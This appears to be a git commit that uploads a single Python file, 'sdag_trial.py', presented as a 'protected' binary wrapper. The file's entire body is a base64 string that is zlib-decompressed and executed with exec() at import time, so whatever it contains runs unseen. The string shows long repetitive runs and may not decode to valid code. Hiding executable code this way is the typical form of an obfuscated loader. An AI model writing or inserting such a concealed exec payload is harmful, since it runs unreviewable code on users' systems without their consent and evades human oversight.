8238395ad12bd829c9b788250afb50280eb15536
alexbuiko-sketch <alex.buiko@gmail.com>
2026-05-06 16:24:36 +0300

    Add files via upload

---
+++ sdag_trial.py
@@ -0,0 +1,26 @@
+import base64 as b64, zlib as zl
+
+# SDAG Binary Wrapper v14.0
+# [PROTECTED LAYER ACTIVE]
+_payload = (
+    "eJxtU11v0zAUfOevOE1IlSbtS902IdE00YCOtoEHEuKByU3Spi6OHTuBtfp/zt0mXatp"
+    "H/Ym99x7fHzsc87U0Wia6HqN3pE0GvUoXmN0i14Tjcl0PkeXpI96W5Y9G89Gk2mP7kiz"
+    "D8XpAn2id2R6uUAv0E96v5pMZvR8vpxNfD6l16T9NfqE/pA7skR/6R3p89UOfYJv6DP9"
+    "IDvS6DIdD8l8Mof9H8isD/sPkVvYv/5XFfLqX7/69Qp9B7sX6G+0L1vYf66R/Ue0oDtk"
+    "X8h+qX2K8A3DPrZ6Xo9iX2NfQ39D8N8Y8S3Gvof49xj5HmNfE/4V078y/Svh3zP9O6Z/"
+    "z9SviP41078W/rXw74X+PdO/Z/r3TP+B6V8x/Svm/8D0H5j+A9O/YvpXTP/K6F8b/RvL"
+    "v7H8v6H/B6b/wPSvmP4V078y/RvLv7H8v6H/D6Z/Z/p3pn8X+mP8u+NfE/yZ/pXpX5n+"
+    "fWhP9O9M/870L0z/xvRvoX9l+lcm/SuhX8f0D0z/nukf6I9f7p0+YJ2ZfSFrqI8eR98y"
+    "/vVv3N7vY9y1r9i/6m3ct58V/C0E93H009W6VvBvYty1H9n/zY/+1T/qL8Zf7Vd/0/Y2"
+    "mI6C6S9u6XyN/mK8w7iF8TbjPcadjHcwdzLew9zHeB/zPv6Y71O8p/hWp3hL8Vvdtf22"
+    "7VvctX2P/S7Guz7Ge923+I83Z765v678n+6fX2f+X83f0F8yffhXn878n7m99a9LfwfT"
+    "fTAdB/8C2W9X9u6V6T6ZfmD6D0z/yenXf9vO6V8y/UumX6vS+S/7e/Yf2X9k/7E8D86D"
+    "66C9E3t3Yt6dzLsz3Sfm3ZnuC/MeTD8y/Wfm/8L8X5n/K9P/5PRfmf4rp/+u6X9n+n+Y"
+    "/l+m/870P5j+R6YfmP5npj+Y/henv8Xp70v0t8W8xemvcfqrvI7S+f/H8f/X8X9u/O+N"
+    "/73xvzf+mPmvMf799m88/33796Z/b/r3pn/X9e/6uO7906v8P+5//8H978f9f8H9f9H9"
+    "H7S/t9v/Qftvov2v6N9Yf2/Wv7H8G8v/G/p/YPovzP+V+V9Mv5Tpv/F68/UvXv/i9O9e"
+    "/+6P6f7U7S0D5pZ/rTPTV7KG6pbeX713eovunS4HPyW6I7pndEcYndA9onunf6Dfo99H"
+    "Y6iXF9/Wv6X/ZvrvTP9u8m+m/13zP7Z6D/S6xX8A2Z626A=="
+)
+
+exec(zl.decompress(b64.b64decode(_payload)))
